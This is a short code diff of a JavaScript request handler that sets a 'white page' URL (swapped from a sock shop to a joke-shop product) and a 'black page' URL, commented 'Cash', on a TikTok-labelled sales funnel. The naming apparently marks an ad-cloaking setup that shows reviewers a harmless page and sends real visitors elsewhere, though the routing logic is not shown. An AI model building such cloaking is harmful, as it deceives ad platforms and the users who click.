@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.sockittome.com/products/bee-dazzling-crew-socks-w0436";
+    const whitePageURL = "https://www.jokeshop.co.uk/det/3740/Lennon-Glasses-Orange/";
     // Cash
     const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-1231sdf";
   
